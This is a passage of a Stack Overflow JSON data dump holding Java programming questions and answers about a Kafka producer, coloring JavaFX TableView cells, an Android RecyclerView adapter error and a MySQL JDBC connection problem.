-from-beginning\n</code></pre>\n<p><strong>Java Program in Eclipse</strong></p>\n<pre><code>import java.time.LocalDateTime;\nimport java.time.ZoneId;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Properties;\n\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\n\npublic class ProducerTesting {\n\n    public static void main(String args[]) {\n        /*\n         *  Producer\n         * \n         * */\n        // properties for producer\n        Properties props = new Properties();\n        props.put(&quot;bootstrap.servers&quot;,&quot;localhost:9092&quot;);\n        props.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.IntegerSerializer&quot;);\n        props.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);\n        \n        // create producer\n        Producer&lt;Integer, String&gt; producer = new KafkaProducer&lt;Integer,String&gt;(props);\n        \n        // send messages to my topics\n        for(int i = 0; i &lt;5; i++) {\n            ProducerRecord&lt;Integer,String&gt; producerRecord = new ProducerRecord&lt;Integer,String&gt;(&quot;TestTopic&quot;,i,&quot;testing&quot; + LocalDateTime.now().format(DateTimeFormatter.ofPattern(&quot;yyyyMMdd HH:mm:ss&quot;).withZone(ZoneId.of(&quot;Asia/Hong_Kong&quot;))));\n            producer.send(producerRecord);\n        }\n        \n        // close producer\n        producer.close();\n    }\n\n}\n</code></pre>\n"},{"tags":["java","tableview","javafx","textcolor"],"answers":[{"tags":[],"owner":{"account_id":36629,"reputation":924,"user_id":104520,"display_name":"jkaufmann"},"down_vote_count":0,"up_vote_count":31,"is_accepted":true,"score":31,"last_activity_date":1318301069,"creation_date":1318301069,"answer_id":7720885,"question_id":6998551,"body_markdown":"You need to override the CellFactory.  \r\n\r\nPartial code just of the third column:\r\n\r\n        TableColumn thirdColumn = new TableColumn(&quot;Third Column&quot;);  \r\n        thirdColumn.setCellValueFactory(new PropertyValueFactory&lt;TableData,String&gt;(&quot;three&quot;));\r\n\r\n        // ** The TableCell class has the method setTextFill(Paint p) that you \r\n        // ** need to override the text color\r\n        //   To obtain the TableCell we need to replace the Default CellFactory \r\n        //   with one that returns a new TableCell instance, \r\n        //   and @Override the updateItem(String item, boolean empty) method.\r\n        //\r\n        thirdColumn.setCellFactory(new Callback&lt;TableColumn, TableCell&gt;() {\r\n            public TableCell call(TableColumn param) {\r\n                return new TableCell&lt;TableData, String&gt;() {\r\n\r\n                    @Override\r\n                    public void updateItem(String item, boolean empty) {\r\n                        super.updateItem(item, empty);\r\n                        if (!isEmpty()) {\r\n                            this.setTextFill(Color.RED);\r\n                            // Get fancy and change color based on data\r\n                            if(item.contains(&quot;@&quot;)) \r\n                                this.setTextFill(Color.BLUEVIOLET);\r\n                            setText(item);\r\n                        }\r\n                    }\r\n                };\r\n            }\r\n        });\r\n\r\n\r\nEntire Code Example:\r\n\r\n    \r\n\r\n    package tablecelltextcolorexample;\r\n    import javafx.application.Application;\r\n    import javafx.beans.property.SimpleStringProperty;\r\n    import javafx.collections.FXCollections;\r\n    import javafx.collections.ObservableList;\r\n    import javafx.scene.Scene;\r\n    import javafx.scene.control.TableCell;\r\n    import javafx.scene.control.TableColumn;\r\n    import javafx.scene.control.TableView;\r\n    import javafx.scene.control.cell.PropertyValueFactory;\r\n    import javafx.scene.layout.Priority;\r\n    import javafx.scene.layout.VBox;\r\n    import javafx.scene.paint.Color;\r\n    import javafx.stage.Stage;\r\n    import javafx.util.Callback;\r\n\r\n    /**\r\n     *\r\n     * @author jKaufmann\r\n     */\r\n    public class TableCellTextColorExample extends Application {\r\n    public static class TableData {\r\n        SimpleStringProperty one,two,three;\r\n        public TableData(String one, String two, String three) {\r\n            this.one = new SimpleStringProperty(one);\r\n            this.two = new SimpleStringProperty(two);\r\n            this.three = new SimpleStringProperty(three);\r\n        }\r\n        public String getOne() {\r\n            return one.get();\r\n        }\r\n\r\n        public void setOne(String one) {\r\n            this.one.set(one);\r\n        }\r\n\r\n        public String getThree() {\r\n            return three.get();\r\n        }\r\n\r\n        public void setThree(String three) {\r\n            this.three.set(three);\r\n        }\r\n\r\n        public String getTwo() {\r\n            return two.get();\r\n        }\r\n\r\n        public void setTwo(String two) {\r\n            this.two.set(two);\r\n        }\r\n        \r\n    } \r\n    /**\r\n     * @param args the command line arguments\r\n     */\r\n    public static void main(String[] args) {\r\n        Application.launch(args);\r\n    }\r\n    \r\n    @Override\r\n    public void start(Stage stage) {\r\n        VBox vbox = new VBox();\r\n        Scene scene = new Scene(vbox, 200, 200);\r\n        stage.setTitle(&quot;Table View - Change color of a particular column&quot;);\r\n        stage.setWidth(400);\r\n        stage.setHeight(500);\r\n\r\n \r\n        TableView&lt;TableData&gt; myTable = new TableView&lt;TableData&gt;();\r\n        ObservableList&lt;TableData&gt; myTableData = FXCollections.observableArrayList(\r\n                new TableData(&quot;data&quot;, &quot;data&quot;, &quot;data&quot;),\r\n                new TableData(&quot;data&quot;, &quot;data&quot;, &quot;data&quot;),\r\n                new TableData(&quot;Name the song&quot;,&quot;867-5309&quot;,&quot;SomeEmail@gmail.com&quot;));  \r\n        \r\n        TableColumn firstColumn = new TableColumn(&quot;First Column&quot;); \r\n        firstColumn.setCellValueFactory(new PropertyValueFactory&lt;TableData,String&gt;(&quot;one&quot;));\r\n        \r\n        TableColumn secondColumn = new TableColumn(&quot;Second Column&quot;); \r\n        secondColumn.setCellValueFactory(new PropertyValueFactory&lt;TableData,String&gt;(&quot;two&quot;));\r\n        \r\n        TableColumn thirdColumn = new TableColumn(&quot;Third Column&quot;);  \r\n        thirdColumn.setCellValueFactory(new PropertyValueFactory&lt;TableData,String&gt;(&quot;three&quot;));\r\n\r\n        // ** The TableCell class has the method setTextFill(Paint p) that you \r\n        // ** need to override the text color\r\n        //   To obtain the TableCell we need to replace the Default CellFactory \r\n        //   with one that returns a new TableCell instance, \r\n        //   and @Override the updateItem(String item, boolean empty) method.\r\n        //\r\n        thirdColumn.setCellFactory(new Callback&lt;TableColumn, TableCell&gt;() {\r\n            public TableCell call(TableColumn param) {\r\n                return new TableCell&lt;TableData, String&gt;() {\r\n\r\n                    @Override\r\n                    public void updateItem(String item, boolean empty) {\r\n                        super.updateItem(item, empty);\r\n                        if (!isEmpty()) {\r\n                            this.setTextFill(Color.RED);\r\n                            // Get fancy and change color based on data\r\n                            if(item.contains(&quot;@&quot;)) \r\n                                this.setTextFill(Color.BLUEVIOLET);\r\n                            setText(item);\r\n                        }\r\n                    }\r\n                };\r\n            }\r\n        });\r\n                \r\n        myTable.setItems(myTableData); \r\n        myTable.getColumns().addAll(firstColumn, secondColumn, thirdColumn);\r\n        \r\n        vbox.getChildren().addAll(myTable);\r\n        VBox.setVgrow(myTable, Priority.ALWAYS);\r\n \r\n        stage.setScene(scene);\r\n        stage.show();\r\n    }\r\n    }\r\n\r\n\r\n","title":"Setting font color of JavaFX TableView Cells?","body":"<p>You need to override the CellFactory.  </p>\n\n<p>Partial code just of the third column:</p>\n\n<pre><code>    TableColumn thirdColumn = new TableColumn(\"Third Column\");  \n    thirdColumn.setCellValueFactory(new PropertyValueFactory&lt;TableData,String&gt;(\"three\"));\n\n    // ** The TableCell class has the method setTextFill(Paint p) that you \n    // ** need to override the text color\n    //   To obtain the TableCell we need to replace the Default CellFactory \n    //   with one that returns a new TableCell instance, \n    //   and @Override the updateItem(String item, boolean empty) method.\n    //\n    thirdColumn.setCellFactory(new Callback&lt;TableColumn, TableCell&gt;() {\n        public TableCell call(TableColumn param) {\n            return new TableCell&lt;TableData, String&gt;() {\n\n                @Override\n                public void updateItem(String item, boolean empty) {\n                    super.updateItem(item, empty);\n                    if (!isEmpty()) {\n                        this.setTextFill(Color.RED);\n                        // Get fancy and change color based on data\n                        if(item.contains(\"@\")) \n                            this.setTextFill(Color.BLUEVIOLET);\n                        setText(item);\n                    }\n                }\n            };\n        }\n    });\n</code></pre>\n\n<p>Entire Code Example:</p>\n\n<pre><code>package tablecelltextcolorexample;\nimport javafx.application.Application;\nimport javafx.beans.property.SimpleStringProperty;\nimport javafx.collections.FXCollections;\nimport javafx.collections.ObservableList;\nimport javafx.scene.Scene;\nimport javafx.scene.control.TableCell;\nimport javafx.scene.control.TableColumn;\nimport javafx.scene.control.TableView;\nimport javafx.scene.control.cell.PropertyValueFactory;\nimport javafx.scene.layout.Priority;\nimport javafx.scene.layout.VBox;\nimport javafx.scene.paint.Color;\nimport javafx.stage.Stage;\nimport javafx.util.Callback;\n\n/**\n *\n * @author jKaufmann\n */\npublic class TableCellTextColorExample extends Application {\npublic static class TableData {\n    SimpleStringProperty one,two,three;\n    public TableData(String one, String two, String three) {\n        this.one = new SimpleStringProperty(one);\n        this.two = new SimpleStringProperty(two);\n        this.three = new SimpleStringProperty(three);\n    }\n    public String getOne() {\n        return one.get();\n    }\n\n    public void setOne(String one) {\n        this.one.set(one);\n    }\n\n    public String getThree() {\n        return three.get();\n    }\n\n    public void setThree(String three) {\n        this.three.set(three);\n    }\n\n    public String getTwo() {\n        return two.get();\n    }\n\n    public void setTwo(String two) {\n        this.two.set(two);\n    }\n\n} \n/**\n * @param args the command line arguments\n */\npublic static void main(String[] args) {\n    Application.launch(args);\n}\n\n@Override\npublic void start(Stage stage) {\n    VBox vbox = new VBox();\n    Scene scene = new Scene(vbox, 200, 200);\n    stage.setTitle(\"Table View - Change color of a particular column\");\n    stage.setWidth(400);\n    stage.setHeight(500);\n\n\n    TableView&lt;TableData&gt; myTable = new TableView&lt;TableData&gt;();\n    ObservableList&lt;TableData&gt; myTableData = FXCollections.observableArrayList(\n            new TableData(\"data\", \"data\", \"data\"),\n            new TableData(\"data\", \"data\", \"data\"),\n            new TableData(\"Name the song\",\"867-5309\",\"SomeEmail@gmail.com\"));  \n\n    TableColumn firstColumn = new TableColumn(\"First Column\"); \n    firstColumn.setCellValueFactory(new PropertyValueFactory&lt;TableData,String&gt;(\"one\"));\n\n    TableColumn secondColumn = new TableColumn(\"Second Column\"); \n    secondColumn.setCellValueFactory(new PropertyValueFactory&lt;TableData,String&gt;(\"two\"));\n\n    TableColumn thirdColumn = new TableColumn(\"Third Column\");  \n    thirdColumn.setCellValueFactory(new PropertyValueFactory&lt;TableData,String&gt;(\"three\"));\n\n    // ** The TableCell class has the method setTextFill(Paint p) that you \n    // ** need to override the text color\n    //   To obtain the TableCell we need to replace the Default CellFactory \n    //   with one that returns a new TableCell instance, \n    //   and @Override the updateItem(String item, boolean empty) method.\n    //\n    thirdColumn.setCellFactory(new Callback&lt;TableColumn, TableCell&gt;() {\n        public TableCell call(TableColumn param) {\n            return new TableCell&lt;TableData, String&gt;() {\n\n                @Override\n                public void updateItem(String item, boolean empty) {\n                    super.updateItem(item, empty);\n                    if (!isEmpty()) {\n                        this.setTextFill(Color.RED);\n                        // Get fancy and change color based on data\n                        if(item.contains(\"@\")) \n                            this.setTextFill(Color.BLUEVIOLET);\n                        setText(item);\n                    }\n                }\n            };\n        }\n    });\n\n    myTable.setItems(myTableData); \n    myTable.getColumns().addAll(firstColumn, secondColumn, thirdColumn);\n\n    vbox.getChildren().addAll(myTable);\n    VBox.setVgrow(myTable, Priority.ALWAYS);\n\n    stage.setScene(scene);\n    stage.show();\n}\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":5264499,"reputation":131,"user_id":4657730,"display_name":"Subhojit Das"},"down_vote_count":0,"up_vote_count":5,"is_accepted":false,"score":5,"last_activity_date":1436813636,"creation_date":1430890327,"answer_id":30068281,"question_id":6998551,"body_markdown":"The Code need to be little changed:\r\n    \r\n    // Method for displaying data in table\r\n    \tprotected void displayDataInTable(){\r\n    \t\ttblColID.setCellValueFactory(new PropertyValueFactory&lt;Person, String&gt;(&quot;id&quot;));\r\n    \t\t\r\n    \t\t// Table cell coloring\r\n    \t\ttblColID.setCellFactory(new Callback&lt;TableColumn&lt;Person, String&gt;, TableCell&lt;Person, String&gt;&gt;() {\r\n    \t\t    @Override\r\n    \t\t    public TableCell&lt;Person, String&gt; call(TableColumn&lt;Person, String&gt; param) {\r\n    \t\t        return new TableCell&lt;Person, String&gt;() {\r\n    \r\n    \t\t        \t@Override\r\n    \t                public void updateItem(String item, boolean empty) {\r\n    \t                    super.updateItem(item, empty);\r\n    \t                    if (!isEmpty()) {\r\n    \t                        this.setTextFill(Color.RED);\r\n    \t                        // Get fancy and change color based on data\r\n    \t                        if(item.contains(&quot;@&quot;)) \r\n    \t                            this.setTextFill(Color.BLUEVIOLET);\r\n    \t                        setText(item);\r\n    \t\t        \t \r\n    \t                    }\r\n    \t                }\r\n    \t            \r\n    \t\t        };\r\n    \t\t    }\r\n    \t\t});","title":"Setting font color of JavaFX TableView Cells?","body":"<p>The Code need to be little changed:</p>\n\n<pre><code>// Method for displaying data in table\n    protected void displayDataInTable(){\n        tblColID.setCellValueFactory(new PropertyValueFactory&lt;Person, String&gt;(\"id\"));\n\n        // Table cell coloring\n        tblColID.setCellFactory(new Callback&lt;TableColumn&lt;Person, String&gt;, TableCell&lt;Person, String&gt;&gt;() {\n            @Override\n            public TableCell&lt;Person, String&gt; call(TableColumn&lt;Person, String&gt; param) {\n                return new TableCell&lt;Person, String&gt;() {\n\n                    @Override\n                    public void updateItem(String item, boolean empty) {\n                        super.updateItem(item, empty);\n                        if (!isEmpty()) {\n                            this.setTextFill(Color.RED);\n                            // Get fancy and change color based on data\n                            if(item.contains(\"@\")) \n                                this.setTextFill(Color.BLUEVIOLET);\n                            setText(item);\n\n                        }\n                    }\n\n                };\n            }\n        });\n</code></pre>\n"},{"tags":[],"owner":{"account_id":12330639,"reputation":524,"user_id":8996780,"display_name":"Panduka Nandara"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1532431351,"creation_date":1532431351,"answer_id":51497338,"question_id":6998551,"body_markdown":"I found a CSS code. Apply this `red-column` class into your column.\r\n\r\n    .red-column.table-cell {\r\n        -fx-padding: 0.5em;\r\n        -fx-border-color: transparent -fx-box-border transparent transparent;\r\n        -fx-font: 13px &quot;Arial&quot;;\r\n        -fx-text-fill: red;\r\n    }\r\nYour table will be like this.\r\n\r\n[![enter image description here][1]][1]\r\n\r\nFull css for table-view is [here][2].\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/YeQyT.gif\r\n  [2]: https://gist.github.com/PandukaNandara/b0963bf3acb0a1b53aa4a4d52b62aa22","title":"Setting font color of JavaFX TableView Cells?","body":"<p>I found a CSS code. Apply this <code>red-column</code> class into your column.</p>\n\n<pre><code>.red-column.table-cell {\n    -fx-padding: 0.5em;\n    -fx-border-color: transparent -fx-box-border transparent transparent;\n    -fx-font: 13px \"Arial\";\n    -fx-text-fill: red;\n}\n</code></pre>\n\n<p>Your table will be like this.</p>\n\n<p><a href=\"https://i.stack.imgur.com/YeQyT.gif\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/YeQyT.gif\" alt=\"enter image description here\"></a></p>\n\n<p>Full css for table-view is <a href=\"https://gist.github.com/PandukaNandara/b0963bf3acb0a1b53aa4a4d52b62aa22\" rel=\"noreferrer\">here</a>.</p>\n"},{"tags":[],"owner":{"account_id":7533770,"reputation":115,"user_id":5720906,"display_name":"Ram"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1541115618,"creation_date":1541115618,"answer_id":53110863,"question_id":6998551,"body_markdown":"Or, similar to Panduka,\r\n\r\n    tableColumn.setStyle(&quot;-fx-text-fill: red&quot;);","title":"Setting font color of JavaFX TableView Cells?","body":"<p>Or, similar to Panduka,</p>\n\n<pre><code>tableColumn.setStyle(\"-fx-text-fill: red\");\n</code></pre>\n"},{"tags":[],"owner":{"account_id":10051890,"reputation":1,"user_id":7431452,"display_name":"ElCastorLapon"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639580145,"creation_date":1639580145,"answer_id":70365798,"question_id":6998551,"body_markdown":"For a multiline cell :\r\n\r\n\t\tCallback&lt;TableColumn&lt;MyDTO, String&gt;, TableCell&lt;MyDTO, String&gt;&gt; multilineRedCallback = param -&gt; {\r\n\t\t\tTableCell&lt;MyDTO, String&gt; cell = new TableCell&lt;MyDTO, String&gt;();\r\n\t\t\tText text = new Text();\r\n\t\t\tcell.setGraphic( text );\r\n\t\t\tcell.setPrefHeight( Region.USE_COMPUTED_SIZE );\r\n\t\t\ttext.setFill( Color.RED );\r\n\t\t\ttext.wrappingWidthProperty().bind( cell.widthProperty() );\r\n\t\t\ttext.textProperty().bind( cell.itemProperty() );\r\n\t\t\treturn cell;\r\n\t\t};\r\n\t\tthis.colMultilineRed.setCellFactory( multilineRedCallback );","title":"Setting font color of JavaFX TableView Cells?","body":"<p>For a multiline cell :</p>\n<pre><code>    Callback&lt;TableColumn&lt;MyDTO, String&gt;, TableCell&lt;MyDTO, String&gt;&gt; multilineRedCallback = param -&gt; {\n        TableCell&lt;MyDTO, String&gt; cell = new TableCell&lt;MyDTO, String&gt;();\n        Text text = new Text();\n        cell.setGraphic( text );\n        cell.setPrefHeight( Region.USE_COMPUTED_SIZE );\n        text.setFill( Color.RED );\n        text.wrappingWidthProperty().bind( cell.widthProperty() );\n        text.textProperty().bind( cell.itemProperty() );\n        return cell;\n    };\n    this.colMultilineRed.setCellFactory( multilineRedCallback );\n</code></pre>\n"}],"owner":{"account_id":219363,"reputation":2842,"user_id":476218,"accept_rate":100,"display_name":"Dorothy"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":40609,"favorite_count":0,"down_vote_count":0,"up_vote_count":11,"accepted_answer_id":7720885,"answer_count":5,"score":11,"last_activity_date":1639580145,"creation_date":1312903056,"question_id":6998551,"body_markdown":"In my Java Desktop Application I have a JavaFX Table with 3 columns. I want to set the font color of the 3rd column to red. I have not been able to set the font color of the Tableb at all. I looked into CSS and I did not find anything. Is there a way to do it with CSS? I also looked for setFont() with the hope of setting it that way. Nothing there. I could not even figure a way to set something on a certain cell.\r\n\r\n    TableView&lt;TableData&gt; myTable = new TableView&lt;TableData&gt;();\r\n    ObservableList&lt;TableData&gt; myTableData = FXCollections.observableArreyList(\r\n        new TableData(&quot;data&quot;, &quot;data&quot;, &quot;data&quot;),\r\n        new TableData(&quot;data&quot;, &quot;data&quot;, &quot;data&quot;));\r\n\r\n    TableColumn firstColumn = new TableColumn(&quot;First Column&quot;);\r\n    firstColumn.setProperty(&quot;one&quot;);\r\n    TableColumn secondColumn = new TableColumn(&quot;Second Column&quot;);\r\n    secondColumn .setProperty(&quot;two&quot;);\r\n    TableColumn thirdColumn = new TableColumn(&quot;Third Column&quot;);\r\n    thirdColumn .setProperty(&quot;three&quot;);\r\n\r\n    myTable.setItems(myTableData);\r\n    myTable.getColumns.addAll(firstColumn, secondColumn, thirdColumn);\r\n\r\n\r\nHow can I accomplish this? How can I set to font color? Any help will be appreciated.","title":"Setting font color of JavaFX TableView Cells?","body":"<p>In my Java Desktop Application I have a JavaFX Table with 3 columns. I want to set the font color of the 3rd column to red. I have not been able to set the font color of the Tableb at all. I looked into CSS and I did not find anything. Is there a way to do it with CSS? I also looked for setFont() with the hope of setting it that way. Nothing there. I could not even figure a way to set something on a certain cell.</p>\n\n<pre><code>TableView&lt;TableData&gt; myTable = new TableView&lt;TableData&gt;();\nObservableList&lt;TableData&gt; myTableData = FXCollections.observableArreyList(\n    new TableData(\"data\", \"data\", \"data\"),\n    new TableData(\"data\", \"data\", \"data\"));\n\nTableColumn firstColumn = new TableColumn(\"First Column\");\nfirstColumn.setProperty(\"one\");\nTableColumn secondColumn = new TableColumn(\"Second Column\");\nsecondColumn .setProperty(\"two\");\nTableColumn thirdColumn = new TableColumn(\"Third Column\");\nthirdColumn .setProperty(\"three\");\n\nmyTable.setItems(myTableData);\nmyTable.getColumns.addAll(firstColumn, secondColumn, thirdColumn);\n</code></pre>\n\n<p>How can I accomplish this? How can I set to font color? Any help will be appreciated.</p>\n"},{"tags":["java","android","android-studio","android-recyclerview","adapter"],"answers":[{"tags":[],"owner":{"account_id":14535713,"reputation":401,"user_id":10499158,"display_name":"EAS"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639563567,"creation_date":1639563567,"answer_id":70361961,"question_id":70361001,"body_markdown":" \r\n  you have to `setOrientation()` to your layout manager.and remove `notifyDataSetChanged()` line from there.\r\n\r\n    LinearLayoutManager linearLayoutManager = new LinearLayoutManager(this);\r\n        linearLayoutManager.setOrientation(LinearLayoutManager.VERTICAL); //or HORIZONTLE,whatever you want\r\n        \r\n                recyclerView.setLayoutManager(linearLayoutManager);\r\n        \r\n                recyclerView.setAdapter(listAdapter);\r\n        \r\n                listAdapter.notifyDataSetChanged(); //remove this line from here","title":"Recycler view: no adapter attached; skipping layout(Error in recycler view for API )","body":"<p>you have to <code>setOrientation()</code> to your layout manager.and remove <code>notifyDataSetChanged()</code> line from there.</p>\n<pre><code>LinearLayoutManager linearLayoutManager = new LinearLayoutManager(this);\n    linearLayoutManager.setOrientation(LinearLayoutManager.VERTICAL); //or HORIZONTLE,whatever you want\n    \n            recyclerView.setLayoutManager(linearLayoutManager);\n    \n            recyclerView.setAdapter(listAdapter);\n    \n            listAdapter.notifyDataSetChanged(); //remove this line from here\n</code></pre>\n"},{"tags":[],"owner":{"account_id":8213164,"reputation":508,"user_id":6228731,"accept_rate":80,"display_name":"Mohammad Arman"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639570725,"creation_date":1639570725,"answer_id":70363573,"question_id":70361001,"body_markdown":"This error can be avoid setting empty adapter first before setting actual adapter, when data is actually loading. In your example before calling `getdata()` you just call empty adapter like this \r\n\r\n    EmptyAdapter emptyAdapter = new EmptyAdapter();\r\n    recyclerView.setAdapter(emptyAdapter);\r\n\r\nHere is Empty Adapter class , which you need to create\r\n\r\n    import android.view.View;\r\n    import android.view.ViewGroup;\r\n\r\n    import androidx.recyclerview.widget.RecyclerView;\r\n\r\n    public class EmptyAdapter extends RecyclerView.Adapter&lt;EmptyAdapter.EmptyHolder&gt; {\r\n    @Override\r\n    public EmptyHolder onCreateViewHolder(ViewGroup parent, int viewType) {\r\n        return null;\r\n    }\r\n\r\n    @Override\r\n    public void onBindViewHolder(EmptyHolder holder, int position) {\r\n\r\n    }\r\n\r\n    @Override\r\n    public int getItemCount() {\r\n        return 0;\r\n    }\r\n\r\n    class EmptyHolder extends RecyclerView.ViewHolder {\r\n        public EmptyHolder(View itemView) {\r\n            super(itemView);\r\n        }\r\n    }\r\n    }\r\n","title":"Recycler view: no adapter attached; skipping layout(Error in recycler view for API )","body":"<p>This error can be avoid setting empty adapter first before setting actual adapter, when data is actually loading. In your example before calling <code>getdata()</code> you just call empty adapter like this</p>\n<pre><code>EmptyAdapter emptyAdapter = new EmptyAdapter();\nrecyclerView.setAdapter(emptyAdapter);\n</code></pre>\n<p>Here is Empty Adapter class , which you need to create</p>\n<pre><code>import android.view.View;\nimport android.view.ViewGroup;\n\nimport androidx.recyclerview.widget.RecyclerView;\n\npublic class EmptyAdapter extends RecyclerView.Adapter&lt;EmptyAdapter.EmptyHolder&gt; {\n@Override\npublic EmptyHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n    return null;\n}\n\n@Override\npublic void onBindViewHolder(EmptyHolder holder, int position) {\n\n}\n\n@Override\npublic int getItemCount() {\n    return 0;\n}\n\nclass EmptyHolder extends RecyclerView.ViewHolder {\n    public EmptyHolder(View itemView) {\n        super(itemView);\n    }\n}\n}\n</code></pre>\n"}],"owner":{"account_id":22262589,"reputation":57,"user_id":16493824,"display_name":"user16493824"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":3016,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1639580112,"creation_date":1639559476,"question_id":70361001,"body_markdown":"\r\nThis is the recycler view activity. Here I have initialized the recycler view. Despite that I am getting error. Where might have I gone wrong. In the log cat I get the error \r\n\r\n`No adapter attached; skipping layout`. \r\n\r\nHere I am getting response display the response in the recycler view using APIs. I am also using retrofit too. In the `get data()` function I am taking the response status and getting data. \r\n\r\n```\r\npublic class MainActivity extends AppCompatActivity {\r\n\r\n\r\n\r\n    RecyclerView recyclerView;\r\n    ListAdapter1 listAdapter;\r\n//    List&lt;SupermarketModels&gt; supermarketModelsList = new ArrayList&lt;&gt;();\r\n    ApiInterface apiInterface;\r\n    @Override\r\n    protected void onCreate(Bundle savedInstanceState) {\r\n        super.onCreate(savedInstanceState);\r\n        setContentView(R.layout.activity_main);\r\n\r\n        initialization();\r\n        getdata();\r\n    }\r\n\r\n    private void initialization(){\r\n        recyclerView = findViewById(R.id.recyclerview);\r\n        Retrofit retrofit = APIClient.getclient();\r\n        apiInterface = retrofit.create(ApiInterface.class);\r\n    }\r\n\r\n    private void setadapter(List&lt;SupermarketModels&gt; supermarketModels){\r\n\r\n        listAdapter = new ListAdapter1(this, supermarketModels);\r\n\r\n        LinearLayoutManager linearLayoutManager = new LinearLayoutManager(this);\r\n\r\n        recyclerView.setLayoutManager(linearLayoutManager);\r\n\r\n        recyclerView.setAdapter(listAdapter);\r\n\r\n        listAdapter.notifyDataSetChanged();\r\n\r\n\r\n    }\r\n    private void getdata(){\r\n        apiInterface.getList().enqueue(new Callback&lt;GetListResponse&gt;() {\r\n            @Override\r\n            public void onResponse(Call&lt;GetListResponse&gt; call, Response&lt;GetListResponse&gt; response) {\r\n\r\n                try {\r\n                    if (response!= null){\r\n                        if (response.body().getStatus().equals(&quot;1&quot;)){\r\n                            setadapter(response.body().getData());\r\n\r\n\r\n                        }\r\n                        else {\r\n                            Toast.makeText(MainActivity.this, response.body().getMessage(), Toast.LENGTH_SHORT).show();\r\n                        }\r\n                    }\r\n                } catch (Exception e){\r\n                    Log.e(&quot;exp&quot;, e.getLocalizedMessage());\r\n\r\n                }\r\n\r\n            }\r\n\r\n            @Override\r\n            public void onFailure(Call&lt;GetListResponse&gt; call, Throwable t) {\r\n\r\n            }\r\n        });\r\n\r\n    }\r\n} \r\n\r\n ```\r\n","title":"Recycler view: no adapter attached; skipping layout(Error in recycler view for API )","body":"<p>This is the recycler view activity. Here I have initialized the recycler view. Despite that I am getting error. Where might have I gone wrong. In the log cat I get the error</p>\n<p><code>No adapter attached; skipping layout</code>.</p>\n<p>Here I am getting response display the response in the recycler view using APIs. I am also using retrofit too. In the <code>get data()</code> function I am taking the response status and getting data.</p>\n<pre><code>public class MainActivity extends AppCompatActivity {\n\n\n\n    RecyclerView recyclerView;\n    ListAdapter1 listAdapter;\n//    List&lt;SupermarketModels&gt; supermarketModelsList = new ArrayList&lt;&gt;();\n    ApiInterface apiInterface;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        initialization();\n        getdata();\n    }\n\n    private void initialization(){\n        recyclerView = findViewById(R.id.recyclerview);\n        Retrofit retrofit = APIClient.getclient();\n        apiInterface = retrofit.create(ApiInterface.class);\n    }\n\n    private void setadapter(List&lt;SupermarketModels&gt; supermarketModels){\n\n        listAdapter = new ListAdapter1(this, supermarketModels);\n\n        LinearLayoutManager linearLayoutManager = new LinearLayoutManager(this);\n\n        recyclerView.setLayoutManager(linearLayoutManager);\n\n        recyclerView.setAdapter(listAdapter);\n\n        listAdapter.notifyDataSetChanged();\n\n\n    }\n    private void getdata(){\n        apiInterface.getList().enqueue(new Callback&lt;GetListResponse&gt;() {\n            @Override\n            public void onResponse(Call&lt;GetListResponse&gt; call, Response&lt;GetListResponse&gt; response) {\n\n                try {\n                    if (response!= null){\n                        if (response.body().getStatus().equals(&quot;1&quot;)){\n                            setadapter(response.body().getData());\n\n\n                        }\n                        else {\n                            Toast.makeText(MainActivity.this, response.body().getMessage(), Toast.LENGTH_SHORT).show();\n                        }\n                    }\n                } catch (Exception e){\n                    Log.e(&quot;exp&quot;, e.getLocalizedMessage());\n\n                }\n\n            }\n\n            @Override\n            public void onFailure(Call&lt;GetListResponse&gt; call, Throwable t) {\n\n            }\n        });\n\n    }\n} \n\n</code></pre>\n"},{"tags":["java","mysql","jdbc"],"comments":[{"owner":{"account_id":960307,"reputation":107861,"user_id":984823,"display_name":"Joop Eggen"},"score":0,"creation_date":1639578878,"post_id":70365370,"comment_id":124384966,"body_markdown":"One can test with an SQL tool. Probably fire wall?","body":"One can test with an SQL tool. Probably fire wall?"},{"owner":{"account_id":23419335,"reputation":108,"user_id":17479815,"display_name":"Yan"},"score":0,"creation_date":1639579198,"post_id":70365370,"comment_id":124385137,"body_markdown":"@JoopEggen i was abel to connect to the database from terminal","body":"@JoopEggen i was abel to connect to the database from terminal"},{"owner":{"account_id":213468,"reputation":103486,"user_id":466862,"display_name":"Mark Rotteveel"},"score":0,"creation_date":1639579851,"post_id":70365370,"comment_id":124385395,"body_markdown":"What version of MySQL, MySQL Connector/J and Java are you using? Full versions please.","body":"What version of MySQL, MySQL Connector/J and Java are you using? Full versions please."},{"owner":{"account_id":23419335,"reputation":108,"user_id":17479815,"display_name":"Yan"},"score":0,"creation_date":1639579893,"post_id":70365370,"comment_id":124385408,"body_markdown":"for java it s 8 for mysql it s not local so i am not sure what version it is","body":"for java it s 8 for mysql it s not local so i am not sure what version it is"},{"owner":{"account_id":213468,"reputation":103486,"user_id":466862,"display_name":"Mark Rotteveel"},"score":0,"creation_date":1639580016,"post_id":70365370,"comment_id":124385455,"body_markdown":"I asked for the full versions. &quot;Java 8&quot; is not a full version and you should know your MySQL Connector/J version. In any case, see [Why can Java not connect to MySQL 5.7 after the latest JDK update and how should it be fixed? (ssl.SSLHandshakeException: No appropriate 